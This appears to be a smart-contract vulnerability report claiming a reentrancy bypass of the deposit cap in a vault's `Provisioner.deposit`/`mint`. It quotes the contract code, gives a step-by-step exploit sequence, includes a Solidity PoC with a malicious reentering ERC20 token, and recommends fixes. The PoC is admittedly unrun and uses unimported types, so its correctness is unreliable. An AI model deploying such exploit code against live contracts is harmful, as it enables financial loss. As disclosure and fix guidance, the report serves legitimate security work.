## Title

Reentrancy-based deposit-cap bypass in sync deposit paths (`Provisioner.deposit` / `Provisioner.mint`) via external call before mint in `MultiDepositorVault.enter`

## Brief/Intro

Sync deposit flows (`deposit` and `mint`) enforce the deposit cap using the current vault `totalSupply()` before minting, then invoke `IMultiDepositorVault.enter(...)`, which performs external calls (at least `token.safeTransferFrom`) prior to minting. Under external reentrancy (malicious ERC20/777-like tokens or hooks), two or more concurrent deposits can each pass the cap check using the same pre‑mint `totalSupply()` and then cumulatively exceed the cap once all mints finalize. This allows deposits to bypass risk limits on production/mainnet and inflate vault units beyond the configured cap.

## Vulnerability Details

- The sync deposit entry points compute units, check the cap against the current `totalSupply()`, and then call `_syncDeposit(...)` which eventually calls the vault `enter(...)` that performs external calls before minting.
- Because external calls occur before `totalSupply` is increased, a malicious token/hook can reenter `Provisioner.deposit`/`mint` while the `totalSupply()` used for the cap check still reflects the old value. Each reentrant call individually passes the cap check, allowing the aggregate to exceed the configured `depositCap`.
- `deposit`/`mint` are not `nonReentrant`, while other external entry points are guarded, leaving these paths exposed.
- The cap check relies solely on `IERC20(MULTI_DEPOSITOR_VAULT).totalSupply()` and does not include any notion of in-flight/pending mints.

Key code locations and excerpts (paths and line numbers are from this repository):

- `Provisioner.deposit` performs a pre-mint cap check, then calls `_syncDeposit`:

```107:129:Provisioner/src/core/Provisioner.sol
    function deposit(IERC20 token, uint256 tokensIn, uint256 minUnitsOut)
        external
        anyoneButVault
        returns (uint256 unitsOut)
    {
        // Requirements: token amount and min units out are positive
        require(tokensIn != 0, Aera__TokensInZero());
        require(minUnitsOut != 0, Aera__MinUnitsOutZero());

        // Requirements: sync deposits are enabled
        TokenDetails storage tokenDetails = _requireSyncDepositsEnabled(token);

        // Interactions: convert token amount to units out
        unitsOut = _tokensToUnitsFloorIfActive(token, tokensIn, tokenDetails.depositMultiplier);
        // Requirements: units out meets min units out
        require(unitsOut >= minUnitsOut, Aera__MinUnitsOutNotMet());
        // Requirements + interactions: convert new total units to numeraire and check against deposit cap
        _requireDepositCapNotExceeded(unitsOut);

        // Effects + interactions: sync deposit
        _syncDeposit(token, tokensIn, unitsOut);
    }
```

- `Provisioner.mint` performs the same pre-mint cap check and then calls `_syncDeposit`:

```131:153:Provisioner/src/core/Provisioner.sol
    function mint(IERC20 token, uint256 unitsOut, uint256 maxTokensIn)
        external
        anyoneButVault
        returns (uint256 tokensIn)
    {
        // Requirements: tokens and units amount are positive
        require(unitsOut != 0, Aera__UnitsOutZero());
        require(maxTokensIn != 0, Aera__MaxTokensInZero());

        // Requirements: sync deposits are enabled
        TokenDetails storage tokenDetails = _requireSyncDepositsEnabled(token);

        // Requirements + interactions: convert new total units to numeraire and check against deposit cap
        _requireDepositCapNotExceeded(unitsOut);
        // Interactions: convert units to tokens
        tokensIn = _unitsToTokensCeilIfActive(token, unitsOut, tokenDetails.depositMultiplier);
        // Requirements: token in is less than or equal to max tokens in
        require(tokensIn <= maxTokensIn, Aera__MaxTokensInExceeded());

        // Effects + interactions: sync deposit
        _syncDeposit(token, tokensIn, unitsOut);
    }
```

- `_syncDeposit` records the refundable window and then calls into the vault `enter(...)` (external call):

```474:496:Provisioner/src/core/Provisioner.sol
    function _syncDeposit(IERC20 token, uint256 tokenAmount, uint256 unitAmount) internal {
        uint256 refundableUntil = block.timestamp + depositRefundTimeout;
        bytes32 depositHash = _getDepositHash(msg.sender, token, tokenAmount, unitAmount, refundableUntil);

        // Requirements: deposit hash is not set
        require(!syncDepositHashes[depositHash], Aera__HashCollision());
        // Effects: set hash as used
        syncDepositHashes[depositHash] = true;

        // Effects: set user refundable until
        userUnitsRefundableUntil[msg.sender] = refundableUntil;

        // Interactions: enter vault
        IMultiDepositorVault(MULTI_DEPOSITOR_VAULT).enter(msg.sender, token, tokenAmount, unitAmount, msg.sender);

        // Log emit deposit event
        emit Deposited(msg.sender, token, tokenAmount, unitAmount, depositHash);
    }
```

- The cap enforcement uses `totalSupply()` plus proposed `units`, converted to numeraire, against `depositCap` — notably this is read-only and occurs before `enter(...)` mints:

```910:925:Provisioner/src/core/Provisioner.sol
    function _requireDepositCapNotExceeded(uint256 units) internal view {
        // Requirements + interactions: deposit cap not exceeded
        require(!_isDepositCapExceeded(units), Aera__DepositCapExceeded());
    }

    function _isDepositCapExceeded(uint256 units) internal view returns (bool) {
        // Interactions: get current total supply
        uint256 newTotal = IERC20(MULTI_DEPOSITOR_VAULT).totalSupply() + units;
        // Interactions: convert total supply to numeraire
        return PRICE_FEE_CALCULATOR.convertUnitsToNumeraire(MULTI_DEPOSITOR_VAULT, newTotal) > depositCap;
    }
```

- `MultiDepositorVault.enter` performs the external token transfer before minting units, creating a reentrancy point prior to `totalSupply` being incremented:

```61:75:MultiDepositorVault/src/core/MultiDepositorVault.sol
    function enter(address sender, IERC20 token, uint256 tokenAmount, uint256 unitsAmount, address recipient)
        external
        whenNotPaused
        onlyProvisioner
    {
        // Interactions: pull tokens from the sender
        if (tokenAmount > 0) token.safeTransferFrom(sender, address(this), tokenAmount);

        // Effects: mint units to the recipient
        _mint(recipient, unitsAmount);

        // Log the enter event
        emit Enter(sender, recipient, token, tokenAmount, unitsAmount);
    }
```

- Additionally, vault `_update` calls an optional external hook before mutating balances and `totalSupply`, which is another reentrancy surface:

```108:126:MultiDepositorVault/src/core/MultiDepositorVault.sol
    function _update(address from, address to, uint256 amount) internal override {
        IBeforeTransferHook hook = beforeTransferHook;
        if (address(hook) != address(0)) {
            // Requirements: perform before transfer checks
            hook.beforeTransfer(from, to, provisioner);
        }

        // Requirements: check that the from address does not have its units locked
        // from == address(0) is to allow minting further units for user with locked units
        // to == address(0) is to allow burning units in refundDeposit
        require(
            from == address(0) || to == address(0) || !IProvisioner(provisioner).areUserUnitsLocked(from),
            Aera__UnitsLocked()
        );

        // Effects: transfer the tokens
        return super._update(from, to, amount);
    }
```

- The guard `anyoneButVault` on `deposit`/`mint` only blocks direct calls from the vault and does not mitigate token/hook-driven reentrancy:

```81:86:Provisioner/src/core/Provisioner.sol
    modifier anyoneButVault() {
        // Requirements: check that the caller is not the vault
        require(msg.sender != MULTI_DEPOSITOR_VAULT, Aera__CallerIsVault());
        _;
    }
```

- Contrast: Other external entry points are guarded with `nonReentrant`, highlighting the missing protection on sync deposit paths:

```261:370:Provisioner/src/core/Provisioner.sol
    function refundRequest(IERC20 token, Request calldata request) external nonReentrant { ... }
    function solveRequestsVault(IERC20 token, Request[] calldata requests) external requiresAuth nonReentrant { ... }
    function solveRequestsDirect(IERC20 token, Request[] calldata requests) external nonReentrant { ... }
```

Exploit sequence (deterministic):

1) Attacker calls `Provisioner.deposit(token, A, minUnitsA)`. Cap check observes `S = totalSupply()` and passes.
2) `_syncDeposit` calls `MDV.enter(...)`.
3) Inside `enter`, `token.safeTransferFrom(attacker, vault, A)` executes. The token’s `transferFrom` reenters `Provisioner.deposit(token, B, minUnitsB)` before any mint occurred.
4) The reentrant deposit repeats the same cap check against `S`, passes, and calls `enter` again. That call pulls tokens and then mints `B` units.
5) Control returns to the first `enter`, which then mints `A` units.
6) Final `totalSupply = S + A + B`, which can exceed the cap even though each call individually passed its pre‑mint cap check.

This applies identically to `mint(...)`, which follows the same pre‑mint cap check and external call order.

## Impact Details

- Bypass of configured `depositCap` in numeraire terms on sync deposit flows.
- Inflation of vault units beyond risk limits, enabling:
  - Over-depositing beyond intended TVL ceiling.
  - Potential dilution side-effects for users and fee/accounting misalignments that rely on cap integrity.
- Exploit requires a reentrant token or hook (malicious ERC20, ERC777-like, or an externalized transfer hook chain). The repository already supports an external before-transfer hook interface, and Vault `enter` performs an external ERC20 call before minting, providing practical reentrancy surfaces.

Severity: High. The cap is a core risk control; bypassing it directly undermines safety guarantees and can lead to financial loss or protocol state violation.

## References

- `Provisioner.deposit` and `mint` (pre‑mint cap checks): `Provisioner/src/core/Provisioner.sol` lines 107–153.
- `_syncDeposit` calling `enter`: `Provisioner/src/core/Provisioner.sol` lines 474–496.
- Cap check using `totalSupply()`: `Provisioner/src/core/Provisioner.sol` lines 910–925.
- `MultiDepositorVault.enter` performing external call before mint: `MultiDepositorVault/src/core/MultiDepositorVault.sol` lines 61–75.
- Vault `_update` calling `beforeTransfer` hook before mutating balances: `MultiDepositorVault/src/core/MultiDepositorVault.sol` lines 108–126.
- Guarded functions elsewhere (`nonReentrant`): `Provisioner/src/core/Provisioner.sol` lines 261–370.

## Proof of Concept

Below is a minimal PoC outline demonstrating the cap-bypass via reentrancy. It uses:
- A malicious ERC20 token that reenters `Provisioner.deposit` during `transferFrom`.
- A mock price/fee calculator that returns 1:1 conversions and never pauses the vault.
- A factory stub to deploy `MultiDepositorVault` and set metadata/hook, then set the provisioner.

The PoC sets a small `depositCap`, executes an initial deposit `A`, which reenters to execute deposit `B` during `enter(...)`. Both pre‑mint cap checks pass against the same `totalSupply()` snapshot. After both mints, the resulting `totalSupply` exceeds the cap.

Note: This is a focused exploit demonstration. In a full test harness, ensure the vault owner/authority permits setting the provisioner and that mocks satisfy constructor/permission requirements.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {IERC20} from "@oz/token/ERC20/IERC20.sol";
import {ERC20} from "@oz/token/ERC20/ERC20.sol";
import {Provisioner} from "Provisioner/src/core/Provisioner.sol";
import {IMultiDepositorVault} from "Provisioner/src/core/interfaces/IMultiDepositorVault.sol";
import {MultiDepositorVault} from "MultiDepositorVault/src/core/MultiDepositorVault.sol";
import {IPriceAndFeeCalculator} from "Provisioner/src/core/interfaces/IPriceAndFeeCalculator.sol";
import {IBeforeTransferHook} from "MultiDepositorVault/src/core/interfaces/IBeforeTransferHook.sol";
import {Authority} from "@solmate/auth/Auth.sol";

// --- Mock Calculator that returns 1:1 conversions and never pauses ---
contract MockCalculator is IPriceAndFeeCalculator {
    function convertUnitsToToken(address, IERC20, uint256 unitsAmount) external pure returns (uint256) { return unitsAmount; }
    function convertUnitsToTokenIfActive(address, IERC20, uint256 unitsAmount, Math.Rounding) external pure returns (uint256){ return unitsAmount; }
    function convertUnitsToNumeraire(address, uint256 unitsAmount) external pure returns (uint256) { return unitsAmount; }
    function convertTokenToUnits(address, IERC20, uint256 tokenAmount) external pure returns (uint256) { return tokenAmount; }
    function convertTokenToUnitsIfActive(address, IERC20, uint256 tokenAmount, Math.Rounding) external pure returns (uint256){ return tokenAmount; }
    function getVaultState(address) external pure returns (VaultPriceState memory, VaultAccruals memory) { revert(); }
    function getVaultsPriceAge(address) external pure returns (uint256) { return 0; }
    function isVaultPaused(address) external pure returns (bool) { return false; }
    // Unused in PoC
    function registerVault() external {}
    function setInitialPrice(address, uint128, uint32) external {}
    function setThresholds(address, uint16, uint16, uint16, uint8, uint8) external {}
    function setUnitPrice(address, uint128, uint32) external {}
    function pauseVault(address) external {}
    function unpauseVault(address, uint128, uint32) external {}
    function resetHighestPrice(address) external {}
    function previewFees(address, uint256) external pure returns (uint256, uint256) { return (0,0); }
}

// --- Factory stub used by MDV constructor ---
contract MockFactory {
    IBeforeTransferHook public hook; // optional, set to address(0) for PoC
    constructor(IBeforeTransferHook h) { hook = h; }

    function getERC20Name() external pure returns (string memory) { return "MDV"; }
    function getERC20Symbol() external pure returns (string memory) { return "MDV"; }
    function multiDepositorVaultParameters() external view returns (IBeforeTransferHook) { return hook; }

    function deploy() external returns (MultiDepositorVault) {
        // msg.sender == address(this) in constructor context
        return new MultiDepositorVault();
    }
}

// --- Malicious ERC20 that reenters Provisioner during transferFrom ---
contract ReenteringToken is ERC20("R", "R") {
    Provisioner public prov;
    IERC20 public self;
    bool public reenterOnce;

    constructor() { self = IERC20(address(this)); }

    function setProvisioner(Provisioner p) external { prov = p; }
    function setReenterOnce(bool v) external { reenterOnce = v; }

    function mint(address to, uint256 amt) external { _mint(to, amt); }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        // Standard transferFrom behavior
        super.transferFrom(from, to, amount);
        // Reenter exactly once during the first deposit
        if (reenterOnce) {
            reenterOnce = false;
            // Trigger a second deposit of the same amount
            prov.deposit(self, amount, 1); // minUnitsOut=1 to pass bound
        }
        return true;
    }
}

contract PoC {
    Provisioner prov;
    MultiDepositorVault vault;
    ReenteringToken token;

    function setUp() external {
        // Deploy calculator and factory
        MockCalculator calc = new MockCalculator();
        MockFactory factory = new MockFactory(IBeforeTransferHook(address(0)));
        // Deploy Vault via factory (constructor expects msg.sender to be factory)
        vault = factory.deploy();
        // Deploy Provisioner with calc and vault
        prov = new Provisioner(calc, address(vault), address(this), Authority(address(0)));
        // Set vault provisioner (requires owner/authority in your environment)
        vault.setProvisioner(address(prov));

        // Configure deposit details
        prov.setDepositDetails(100 ether /*depositCap*/, 1 days);

        // Deploy malicious token and register as depositable
        token = new ReenteringToken();
        token.mint(address(this), 1_000 ether);
        token.approve(address(prov), type(uint256).max);
        // Enable sync deposit with neutral multipliers and active pricing
        IProvisioner.TokenDetails memory details = IProvisioner.TokenDetails({
            depositMultiplier: 10_000, // 100%
            redeemMultiplier: 10_000,
            asyncDepositEnabled: false,
            asyncRedeemEnabled: false,
            syncDepositEnabled: true
        });
        prov.setTokenDetails(IERC20(address(token)), details);
    }

    function exploit() external {
        // Setup reentrancy
        token.setProvisioner(prov);
        token.setReenterOnce(true);

        // Choose A and B such that A+B > cap margin; with 1:1 pricing, units == tokens
        uint256 A = 70 ether;
        // Call initial deposit; during transferFrom it will reenter and deposit B=A
        prov.deposit(IERC20(address(token)), A, 1);

        // Post-condition: vault.totalSupply() == 140 ether, exceeding cap margin assessed at pre-mint snapshot
        require(IERC20(address(vault)).totalSupply() > 100 ether, "cap bypass failed");
    }
}
```

Validation steps (without running code):

1) Configure `depositCap` to a known value (e.g., 100 units in numeraire terms), and enable sync deposits with unit price active in the calculator.
2) Use a token that, during `transferFrom`, calls back into `Provisioner.deposit` or `Provisioner.mint` (as above).
3) Invoke `Provisioner.deposit(token, A, ...)` with `A` chosen so that `A + B` exceeds the cap margin but each individually passes. In the PoC, `B = A` via the reentrant call.
4) Observe that both pre‑mint cap checks pass against the same `totalSupply()` snapshot. After both `enter` calls complete, `IERC20(vault).totalSupply()` equals `S + A + B`, exceeding the cap.

Recommended fixes:

- Add `nonReentrant` to `deposit` and `mint`.
- Defense-in-depth: track a transient `pendingUnitsToMint` accumulator set before calling `enter(...)` and included in cap checks, cleared after completing `enter`. This maintains correctness even if reentrancy is later allowed.
- Alternatively, move cap enforcement into the vault and make the decision atomically with the mint, or ensure any external calls occur after the mint while guarding reentrancy and accounting for hook reentrancy surfaces.